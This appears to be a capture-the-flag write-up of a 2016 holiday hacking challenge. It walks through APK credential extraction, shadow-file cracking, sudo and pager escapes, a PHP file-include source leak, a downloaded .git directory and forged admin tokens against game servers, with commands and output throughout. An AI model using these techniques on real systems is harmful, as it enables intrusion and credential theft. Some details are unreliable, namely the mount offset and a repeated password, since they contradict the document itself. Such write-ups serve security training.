@@ -1,0 +1,461 @@
+--- Part 1 ---
+1) What is the secret message in Santa's tweets?
+
+> Copy all tweets from twitter.com/santawclaus
+> Replace ^((.){1,74}|(.){76,})$ with ""
+> Replace \n+ with \n
+> Read "Bug Bounty"
+ 
+2) What is inside the ZIP file distributed by Santa's team?
+
+> Instagram billeder:
+>> 	SantaGram_v4.2.zip
+>>      northpolewonderland.com
+> Download northpolewonderland.com/SantaGram_v4.2.zip
+> The zip file is password protected, the password is 'bugbounty', inside is the file "SantaGram_4.2.apk"
+
+
+
+
+
+
+--- Part 2 ---
+3) What username and password are embedded in the APK file?
+
+> Jadx SantaGram_4.2.apk -> SplashScreen:
+jSONObject.put("username", "guest");
+jSONObject.put("password", "busyreindeer78");
+            
+4) What is the name of the audible component (audio file) in the SantaGram APK file?
+
+> Extract apk file, enter directory
+> find . -type f -exec file -b {} \; | cut -d, -f1 | sort | uniq -c | sort -n
+      1 Audio file with ID3 version 2.3.0
+      1 Dalvik dex file version 035
+      1 empty
+      1 HTML document
+      1 JPEG image data
+      2 ASCII text
+      2 data
+    139 Android binary XML
+    261 PNG image data
+
+> apktool d SantaGram_4.2.apk                                                
+I: Using Apktool 2.2.1 on SantaGram_4.2.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+
+> find . -type f -exec file -b {} \; | cut -d, -f1 | sort | uniq -c | sort -n
+      1 Android binary XML
+      1 Audio file with ID3 version 2.3.0
+      1 data
+      1 HTML document
+      1 JPEG image data
+      3 C source
+    261 PNG image data
+    263 XML 1.0 document
+   1769 ASCII text
+
+> cat res/values/strings.xml | grep http
+    <string name="analytics_launch_url">https://analytics.northpolewonderland.com/report.php?type=launch</string>
+    <string name="analytics_usage_url">https://analytics.northpolewonderland.com/report.php?type=usage</string>
+    <string name="banner_ad_url">http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5</string>
+    <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>
+    <string name="dungeon_url">http://dungeon.northpolewonderland.com/</string>
+    <string name="exhandler_url">http://ex.northpolewonderland.com/exception.php</string>
+
+> find . -name "*.mp3" -o -name "*.ogg"
+./res/raw/discombobulatedaudio1.mp3
+
+
+
+
+
+
+--- Part 3 ---
+5) What is the password for the "cranpi" account on the Cranberry Pi system?
+
+> fdisk -l cranbian-jessie.img 
+Disk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x5a7089a1
+
+Device               Boot  Start     End Sectors  Size Id Type
+cranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)
+cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux
+
+> mkdir mnt-cranbian-jessie
+> mount -v -o offset=$((512*2713599)) -t ext4 cranbian-jessie.img mnt-cranbian-jessie
+> cd mnt-cranbian-jessie
+> john -wordlist:../rockyou.txt etc/shadow 
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ 
+yummycookies     (cranpi)
+ 1g 0:00:18:37 100% 0.000894g/s 406.5p/s 406.5c/s 406.5C/s yves69..yukata
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+6) How did you open each terminal door and where had the villain imprisoned Santa? 
+
+TERMINAL: Elf House #2 
+> sudo -l
+sudo: unable to resolve host 6db8d94cfbae
+Matching Defaults entries for scratchy on 6db8d94cfbae:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User scratchy may run the following commands on 6db8d94cfbae:
+    (itchy) NOPASSWD: /usr/sbin/tcpdump
+    (itchy) NOPASSWD: /usr/bin/strings
+
+> sudo -u itchy /usr/sbin/tcpdump -X -r /out.pcap | grep -C 3 half | more
+        
+		0x0030:  0009 bd42 4745 5420 2f66 6972 7374 6861  ...BGET./firstha
+        0x0040:  6c66 2e68 746d 6c20 4854 5450 2f31 2e31  lf.html.HTTP/1.1
+        0x0050:  0d0a 5573 6572 2d41 6765 6e74 3a20 5767  ..User-Agent:.Wg
+        0x0060:  6574 2f31 2e31 372e 3120 2864 6172 7769  et/1.17.1.(darwi
+		
+> Aha! "firsthalf.html" 
+        0x0040:  3e3c 2f68 6561 643e 0a3c 626f 6479 3e0a  ></head>.<body>.
+        0x0050:  3c66 6f72 6d3e 0a3c 696e 7075 7420 7479  <form>.<input.ty
+        0x0060:  7065 3d22 6869 6464 656e 2220 6e61 6d65  pe="hidden".name
+        0x0070:  3d22 7061 7274 3122 2076 616c 7565 3d22  ="part1".value="
+        0x0080:  7361 6e74 6173 6c69 2220 2f3e 0a3c 2f66  santasli"./>.</f
+        0x0090:  6f72 6d3e 0a3c 2f62 6f64 793e 0a3c 2f68  orm>.</body>.</h
+>> First part is: santasli   .... Guessing "santaslittlehelper" - Dingdingding
+
+> Let's look for "second" in the pcap
+> sudo -u itchy /usr/sbin/tcpdump -X -r /out.pcap | grep -C 3 second
+        0x0030:  0009 bd44 4745 5420 2f73 6563 6f6e 6468  ...DGET./secondh
+        0x0040:  616c 662e 6269 6e20 4854 5450 2f31 2e31  alf.bin.HTTP/1.1
+        0x0050:  0d0a 5573 6572 2d41 6765 6e74 3a20 5767  ..User-Agent:.Wg
+        0x0060:  6574 2f31 2e31 372e 3120 2864 6172 7769  et/1.17.1.(darwi
+> Alright, so it's a bin file.
+
+
+TERMINAL: Workshop - Train Station
+> HELP
+>> Starts a 'less' instance showing /home/conductor/TrainHelper.txt
+> :e /home/conductor/<tab>
+> :e /home/conductor/ActivateTrain
+"/home/conductor/ActivateTrain" may be a binary file. See it anyway?" <- Yup.
+ Bit of plaintext dump:
+ GET /####?UID=####&token=AE4B5D25-A7BA-4129-9AF1-1CF5A3EF9EDC
+ HTTP/1.1
+ Host: localhost
+ QUEST_UID:#####
+ 10.240.0.19
+
+> :e /home/conductor/<tab>
+> :e /home/conductor/Train_Console
+#!/bin/bash
+HOMEDIR="/home/conductor"
+CTRL="$HOMEDIR/"
+DOC="$HOMEDIR/TrainHelper.txt"
+PAGER="less"
+BRAKE="on"
+PASS="24fb3e89ce2aa0ea422c3d511d40dd84"
+print_header() {
+        echo ""
+        echo "Train Management Console: AUTHORIZED USERS ONLY"
+        echo ""
+}
+print_main_menu() {
+        echo ""
+        echo "                  ==== MAIN MENU ===="
+        echo ""
+        echo "STATUS:                   Train Status"
+        echo "BRAKEON:                  Set Brakes"
+        echo "BRAKEOFF:                 Release Brakes"
+        echo "START:                            Start Train"
+        echo "HELP:                             Open the help document"
+        echo "QUIT:                             Exit console"
+        echo ""
+        echo -n "menu:main> "
+}
+# MAIN
+
+> Bingo, a password!
+> BRAKEOFF
+> START
+> Insert password and welcome to 1978.
+>> Explore and find a few NetWars coins
+
+TERMINAL: Workshop (Bottom one)
+> ls -al
+total 32
+drwxr-xr-x 20 elf  elf  4096 Dec  6 19:40 .
+drwxr-xr-x 22 root root 4096 Dec  6 19:40 ..
+-rw-r--r--  1 elf  elf   220 Nov 12  2014 .bash_logout
+-rw-r--r--  1 elf  elf  3924 Dec  6 19:40 .bashrc
+drwxr-xr-x 18 root root 4096 Dec  6 19:40 .doormat
+-rw-r--r--  1 elf  elf   675 Nov 12  2014 .profile
+drwxr-xr-x  2 root root 4096 Dec  6 19:39 temp
+drwxr-xr-x  2 root root 4096 Dec  6 19:39 var
+>> A doormat, eh?
+> find .doormat/ -type f -name "*" -print0 | xargs -0 echo
+.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
+> cd .doormat/.\ /\ /\\/
+> cd \\\\/
+>  cd Don\'t\ Look\ Here\!/You\ are\ persistent\,\ aren\'t\ you\?/\'/
+> cat key_for_the_door.txt
+open_sesame
+
+TERMINAL: Workshop (Top one)
+> strings wumpus
+> "usage: wump [parameters]"
+> So it takes commandline options
+> a:b:hp:r:t: -> a:arrows, b:bats, hp:??, r:rooms, t:tunnels
+
+> ./wumpus
+>> Passphrase:
+>> WUMPUS IS MISUNDERSTOOD
+
+TERMINAL: Santa's Office (https://github.com/abs0/wargames/blob/master/wargames.sh)
+> Hello.
+> I'm fine. How are you?
+> People sometimes make mistakes.
+> Love to. How about Global Thermonuclear War?
+> Later. Let's play Global Thermonuclear War.
+
+> 2
+> Las Vegas
+
+> LOOK AT THE PRETTY LIGHTS
+
+Santa is trapped in DFER in 1978.
+
+ 
+ 
+ 
+ 
+--- Part 4 ---
+
+7) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS: 
+
+- The Mobile Analytics Server (via credentialed login access) (Done) -
+>> access: https://analytics.northpolewonderland.com/
+>> login using guest/reindeer78
+>> Download mp3
+
+
+
+- The Dungeon Game (Done) -
+> Create script:
+#!/usr/bin/env python 
+print "GDT"
+for i in range(1, 218):
+    print "TK"
+    print i
+
+print "exit"
+print
+
+> Run script and copy output.
+
+>> nc dungeon.northpolewonderland.com 11111
+>Copy output from script and then
+
+>>drop elf
+The elf appears increasingly impatient.
+>>give gold card to elf
+The elf, satisified with the trade says - 
+send email to "peppermint@northpolewonderland.com" for that which you seek.
+The elf says - you have conquered this challenge - the game will now end.
+Your score is 15 [total of 585 points], in 2 moves.
+This gives you the rank of Beginner.
+
+> Ship off an email and get a reply(Along with discombobulatedaudio3.mp3)
+You tracked me down, of that I have no doubt.
+
+I won't get upset, to avoid the inevitable bout.
+
+You have what you came for, attached to this note.
+
+Now go and catch your villian, and we will alike do dote.
+
+
+
+- The Debug Server (Done) -
+> Sniff trafic from APK and send that to the server.
+>> curl -i -H "Content-Type: application/json" -d @debug.json -X POST "http://dev.northpolewonderland.com/index.php"
+
+{"date":"20161228133836","status":"OK","filename":"debug-20161228133836-0.txt","request":{"date":"20161228095114+0100","udid":"fa0eef1fcb9c0c7b","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":9223372036854775807,"verbose":false}}% 
+
+> Okay. .... "verbose":false .... Add that to our JSON and set it to true
+>> curl -i -H "Content-Type: application/json" -d @debug.json -X POST "http://dev.northpolewonderland.com/index.php"
+
+{"date":"20161228133418","date.len":14,"status":"OK","status.len":"2","filename":"debug-20161228133418-0.txt","filename.len":26,"request":{"date":"20161228095114+0100","udid":"fa0eef1fcb9c0c7b","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":9223372036854775807,"verbose":true},"files":["debug-20161224235959-0.mp3","debug-20161228132132-0.txt","debug-20161228133354-0.txt","debug-20161228133418-0.txt","index.php"]}
+
+> And there we have the mp3 file. 'debug-20161224235959-0.mp3'
+
+
+
+- The Banner Ad Server -
+
+HomeQuotes.find().fetch()
+Array [ Object, Object, Object, Object, Object ]
+HomeQuotes.find().fetch()[4]
+Object { _id: "zPR5TpxB5mcAH3pYk", index: 4, quote: "Just Ad It!", hidden: true, audio: "/ofdAR4UYRaeNxMg/discombobulatedaud…" }
+HomeQuotes.find().fetch()[4]["audio"]
+"/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3"
+
+
+
+- The Uncaught Exception Handler Server (Done) -
+> ex.northpolewonderland.com (104.154.196.33)
+
+> access: ex.northpolewonderland.com/exception.php  (This was pulled from the SantaGram apk)
+>> Output: Request method must be POST
+
+> Alright, let's pull out 'curl and do a post request.
+>> curl -i -X POST 104.154.196.33/exception.php
+HTTP/1.1 200 OK
+Server: nginx/1.10.2
+Date: Mon, 26 Dec 2016 10:29:02 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+Content type must be: application/json
+
+> Okay, let's send some JSON then.
+>> curl -H "Content-Type: application/json" -d '{}' -X POST 104.154.196.33/exception.php
+
+Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.
+
+>> curl -H "Content-Type: application/json" -d '{"operation":"ReadCrashDump"}' -X POST 104.154.196.33/exception.php 
+
+Fatal error! JSON key 'data' must be set.
+
+> At this point it's time to make a file for this.
+
+>> curl -H "Content-Type: application/json" -d @exception.write.json -X POST 104.154.196.33/exception.php
+>> curl -H "Content-Type: application/json" -d @exception.read.json -X POST 104.154.196.33/exception.php
+
+PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDogZGlzY29tYm9idWxhdGVkLWF1ZGlvLTYtWHl6RTNOOVlxS05ILm1wMwoKIyBDb2RlIGZyb20gaHR0cDovL3RoaXNpbnRlcmVzdHNtZS5jb20vcmVjZWl2aW5nLWpzb24tcG9zdC1kYXRhLXZpYS1waHAvCiMgTWFrZSBzdXJlIHRoYXQgaXQgaXMgYSBQT1NUIHJlcXVlc3QuCmlmKHN0cmNhc2VjbXAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10sICdQT1NUJykgIT0gMCl7CiAgICBkaWUoIlJlcXVlc3QgbWV0aG9kIG11c3QgYmUgUE9TVFxuIik7Cn0KCSAKIyBNYWtlIHN1cmUgdGhhdCB0aGUgY29udGVudCB0eXBlIG9mIHRoZSBQT1NUIHJlcXVlc3QgaGFzIGJlZW4gc2V0IHRvIGFwcGxpY2F0aW9uL2pzb24KJGNvbnRlbnRUeXBlID0gaXNzZXQoJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA/IHRyaW0oJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA6ICcnOwppZihzdHJjYXNlY21wKCRjb250ZW50VHlwZSwgJ2FwcGxpY2F0aW9uL2pzb24nKSAhPSAwKXsKICAgIGRpZSgiQ29udGVudCB0eXBlIG11c3QgYmU6IGFwcGxpY2F0aW9uL2pzb25cbiIpOwp9CgkKIyBHcmFiIHRoZSByYXcgUE9TVC4gTmVjZXNzYXJ5IGZvciBKU09OIGluIHBhcnRpY3VsYXIuCiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRvYmogPSBqc29uX2RlY29kZSgkY29udGVudCwgdHJ1ZSk7CgkjIElmIGpzb25fZGVjb2RlIGZhaWxlZCwgdGhlIEpTT04gaXMgaW52YWxpZC4KaWYoIWlzX2FycmF5KCRvYmopKXsKICAgIGRpZSgiUE9TVCBjb250YWlucyBpbnZhbGlkIEpTT04hXG4iKTsKfQoKIyBQcm9jZXNzIHRoZSBKU09OLgppZiAoICEgaXNzZXQoICRvYmpbJ29wZXJhdGlvbiddKSBvciAoCgkkb2JqWydvcGVyYXRpb24nXSAhPT0gIldyaXRlQ3Jhc2hEdW1wIiBhbmQKCSRvYmpbJ29wZXJhdGlvbiddICE9PSAiUmVhZENyYXNoRHVtcCIpKQoJewoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ29wZXJhdGlvbicgbXVzdCBiZSBzZXQgdG8gV3JpdGVDcmFzaER1bXAgb3IgUmVhZENyYXNoRHVtcC5cbiIpOwp9CmlmICggaXNzZXQoJG9ialsnZGF0YSddKSkgewoJaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiV3JpdGVDcmFzaER1bXAiKSB7CgkJIyBXcml0ZSBhIG5ldyBjcmFzaCBkdW1wIHRvIGRpc2sKCQlwcm9jZXNzQ3Jhc2hEdW1wKCRvYmpbJ2RhdGEnXSk7Cgl9CgllbHNlaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiUmVhZENyYXNoRHVtcCIpIHsKCQkjIFJlYWQgYSBjcmFzaCBkdW1wIGJhY2sgZnJvbSBkaXNrCgkJcmVhZENyYXNoZHVtcCgkb2JqWydkYXRhJ10pOwoJfQp9CmVsc2UgewoJIyBkYXRhIGtleSB1bnNldAoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ2RhdGEnIG11c3QgYmUgc2V0LlxuIik7Cn0KZnVuY3Rpb24gcHJvY2Vzc0NyYXNoZHVtcCgkY3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7Cgkkb3V0cHV0ZmlsZW5hbWUgPSB0ZW1wbmFtKCRiYXNlcGF0aCwgImNyYXNoZHVtcC0iKTsKCXVubGluaygkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkb3V0cHV0ZmlsZW5hbWUgPSAkb3V0cHV0ZmlsZW5hbWUgLiAiLnBocCI7CgkkYmFzZW5hbWUgPSBiYXNlbmFtZSgkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkY3Jhc2hkdW1wX2VuY29kZWQgPSAiPD9waHAgcHJpbnQoJyIgLiBqc29uX2VuY29kZSgkY3Jhc2hkdW1wLCBKU09OX1BSRVRUWV9QUklOVCkgLiAiJyk7IjsKCWZpbGVfcHV0X2NvbnRlbnRzKCRvdXRwdXRmaWxlbmFtZSwgJGNyYXNoZHVtcF9lbmNvZGVkKTsKCQkJCglwcmludCA8PDxFTkQKewoJInN1Y2Nlc3MiIDogdHJ1ZSwKCSJmb2xkZXIiIDogImRvY3MiLAoJImNyYXNoZHVtcCIgOiAiJGJhc2VuYW1lIgp9CgpFTkQ7Cn0KZnVuY3Rpb24gcmVhZENyYXNoZHVtcCgkcmVxdWVzdGVkQ3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7CgljaGRpcigkYmFzZXBhdGgpOwkJCgkKCWlmICggISBpc3NldCgkcmVxdWVzdGVkQ3Jhc2hkdW1wWydjcmFzaGR1bXAnXSkpIHsKCQlkaWUoIkZhdGFsIGVycm9yISBKU09OIGtleSAnY3Jhc2hkdW1wJyBtdXN0IGJlIHNldC5cbiIpOwoJfQoKCWlmICggc3Vic3RyKHN0cnJjaHIoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10sICIuIiksIDEpID09PSAicGhwIiApIHsKCQlkaWUoIkZhdGFsIGVycm9yISBjcmFzaGR1bXAgdmFsdWUgZHVwbGljYXRlICcucGhwJyBleHRlbnNpb24gZGV0ZWN0ZWQuXG4iKTsKCX0KCWVsc2UgewoJCXJlcXVpcmUoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10gLiAnLnBocCcpOwoJfQkKfQoKPz4K
+
+> Decode base64 and we have:
+# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3
+
+
+
+- The Mobile Analytics Server (post authentication) (Done) -
+> Discover analytics.northpolewonderland.com/.git
+>> wget -r --no-parent https://analytics.northpolewonderland.com/.git/
+>> git log
+>> git revert 16ae0cbe2630a87c0470b9a864bf048e813826db
+
+> Time to look at code.
+<?php
+define('KEY', "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc");
+
+function encrypt($data) {
+    return mcrypt_encrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');
+}
+
+$auth = bin2hex(encrypt(json_encode([
+    'username' => "administrator",
+    'date' => "2016-12-26T19:01:59+0000",
+])));
+echo $auth;
+?>
+82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9c6549b849486263a40a63b71976884152
+
+> And with that token we have admin access.
+
+> Next up visit
+>> https://analytics.northpolewonderland.com/edit.php?id=eccbca8b-3696-4321-bcc3-875c6d4c4992&query=SELECT%20*,%20TO_BASE64(mp3)%20FROM%20audio
+
+> and then
+>> https://analytics.northpolewonderland.com/view.php?id=eccbca8b-3696-4321-bcc3-875c6d4c4992
+
+> And you can extract both sound files from this website as base64.
+
+
+
+8) What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.) 
+
+discombobulatedaudio1.mp3
+discombobulatedaudio2.mp3
+discombobulatedaudio3.mp3
+debug-20161224235959-0.mp3
+discombobulatedaudio5.mp3
+discombobulated-audio-6-XyzE3N9YqKNH.mp3
+discombobulatedaudio7.mp3
+
+> Combine files, play at 8 times speed:
+>> Father Christmas, Santa Claus. Or, as I've always known him, Jeff.
+
+--- Part 5 ---
+9) Who is the villain behind the nefarious plot. 
+Dr. Who - The question of the hour is this: Who nabbed Santa.
+Dr. Who - The answer? Yes, I did.
+
+10) Why had the villain abducted Santa? 
+Dr. Who - Next question: Why would anyone in his right mind kidnap Santa Claus?
+Dr. Who - The answer: Do I look like I'm in my right mind? I'm a madman with a box.
+Dr. Who - I have looked into the time vortex and I have seen a universe in which the Star Wars Holiday Special was NEVER released. In that universe, 1978 came and went as normal. No one had to endure the misery of watching that abominable blight. People were happy there. It's a better life, I tell you, a better world than the scarred one we endure here.
+Dr. Who - Give me a world like that. Just once.
+Dr. Who - So I did what I had to do. I knew that Santa's powerful North Pole Wonderland Magick could prevent the Star Wars Special from being released, if I could leverage that magick with my own abilities back in 1978. But Jeff refused to come with me, insisting on the mad idea that it is better to maintain the integrity of the universe’s timeline. So I had no choice – I had to kidnap him.
+Dr. Who - It was sort of one of those days.
+Dr. Who - Well. You know what I mean.
+Dr. Who - Anyway... Since you interfered with my plan, we'll have to live with the Star Wars Holiday Special in this universe... FOREVER.  If we attempt to go back again, to cross our own timeline, we'll cause a temporal paradox, a wound in time.
+Dr. Who - We'll never be rid of it now. The Star Wars Holiday Special will plague this world until time itself ends... All because you foiled my brilliant plan.  Nice work.
+
+
+
+--- Net Wars coins ---
+ - Elf House #1 -> Secret Fireplace Room
+ - Elf House #2 -> shelf on the right side
+ - Elf house #2 -> Right side of couch
+ - Elf House #2 -> Room 2 -> Along the south wall
+ - On the right side of the netwars tree house roof
+ - Outside on the right side of the house below oracle tree
+ - Workshop - Santa's Office - The Corridor -> Crates to the left
+ - Workshop - DFER -> On the right edge. (WUMPUS door)
+ 
+ - 1978 The Big Tree -> Next to the bed
+ - 1978 NetWars Experience Treehoouse -> Behind the space invaders board
+ - 1978 Workshop - Train Station -> Near the edge of the tiles
+ - 1978 Behind Holly Evergreen
+ - 1978 Santa's Office -> In the hand of the armor stand
+ - 1978 Behind the roof of the lower house left of "Days since the last ..."
+ - 1978 - Workshop - behind crates
+
+
+--- In scope IPs ---
+130.211.124.143  -  File download only
+
+104.198.252.157  -  analytics.northpolewonderland.com
+35.184.63.245    -  dev.northpolewonderland.com
+104.154.196.33   -  ex.northpolewonderland.com
+35.184.47.139    -  dungeon.northpolewonderland.com
+104.198.221.240  -  ads.northpolewonderland.com
+
+
+--- urls ---
+Links:
+https://wiki.skullsecurity.org/index.php?title=Passwords
+https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image
+https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities
+https://ibotpeaches.github.io/Apktool/
+https://www.youtube.com/watch?v=mo2yZVRicW0
+https://www.meteor.com/
+https://pen-testing.sans.org/blog/2016/12/06/mining-meteor
+https://github.com/nidem/MeteorMiner
+https://tampermonkey.net/
+http://www.northpolewonderland.com/dungeon.zip
+http://www.willhackforsushi.com/presentations/gitd-hackfest.pptx
+https://www.northpolewonderland.com/cranbian.img.zip
